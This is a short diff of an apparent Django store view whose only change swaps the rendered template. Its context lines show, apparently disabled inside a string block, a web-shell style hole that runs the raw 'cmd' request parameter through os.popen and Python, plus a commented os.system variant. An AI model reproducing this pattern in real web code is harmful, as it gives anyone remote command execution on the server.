@@ -12,4 +12,4 @@ def home(request):
         output = os.popen("cd ..; python -c \"{}\"".format(request.GET['cmd'])).read()
     #output = os.system('cd ..; ' + request.GET['cmd'])
     """
-    return render(request, 'store/paypal-checkout.html')
+    return render(request, 'store/index.html')
